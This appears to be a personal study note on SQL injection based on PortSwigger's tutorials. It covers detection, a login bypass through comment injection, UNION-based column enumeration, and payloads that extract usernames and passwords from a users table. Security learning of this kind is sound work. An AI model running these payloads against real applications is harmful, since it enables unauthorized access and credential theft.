[[Bug]]
Sources : [portswigger sqli](https://portswigger.net/web-security/sql-injection)

SQLi = send DB commands through user input. I can confirm it if I see error leaks or time delays. Use `' or 1=1--` to test first.

using [[sqlmap]] will save a lots
##### ways to detect SQL injection vulnerabilities
- use `'` in the end and check for error or any thing that tell you there is a bug
- sometimes when change the value of entry point this will cause different in the response
- use boolean like `' OR '1'='1` or `' OR 1=1` or use `' AND '1'='1` then check for any different
- use payloads that can cause time delay , [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) 
- use payloads that made out-of-band interaction , [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) 

##### Retrieving hidden data

using boolean to retrieving hidden data  using payloads like this 
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

##### Subverting application logic

it use something like `--` (which will comment what after it )
it can add after username to comment the password and will cause login using only username `username = administrator'--&password = p@ass4word` 
even if the password was wrong


##### Retrieving data from other database tables(UNION)

`UNION` keyword to execute an additional `SELECT` query and append the results to the original query. but it have two requirements must to met:

- should both tables have the same number of columns 
- should every columns of both tables have the same type of data

###### Determining the number of columns required

there's a lot of ways like **`ordre by`**  for example:
**`' ORDER BY 3--`**

but the most use is **`NULL`** for example:
**`' UNION SELECT NULL,NULL--`**

**(NOTE: when using it , should keep adding `,NULL` until the error disappears )**

some database will not work on it , for example on **Oracle** will need to add known table to it for default **built-in table** , will use this table **`dual`** for example 
`' UNION SELECT NULL FROM DUAL--`

**(NOTE: you will need to check payloads cheat sheet to know the different between different databases  )**

after know how many columns , then we need to know what the type of data is for every column
for that we can use this :
```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--`
```
if it work on any one of these , this mean this specific column datatype is **string** 

###### Using a SQL injection UNION attack to retrieve interesting data
after knowing all of these we need to use this to exploit it 

assuming there's table called **`users`** and have different columns one of them is **`username`** and the other one is **`password`**,  here you can use this payload to retrieve their info:
`' UNION SELECT username, password FROM users--`

when needs to retrieve two columns and only have one column that can retrieve string , here you have two option 
- retrieve one after one , not together
- use this payload to retrieve two columns in one column
  `' UNION SELECT username || '~' || password FROM users--`

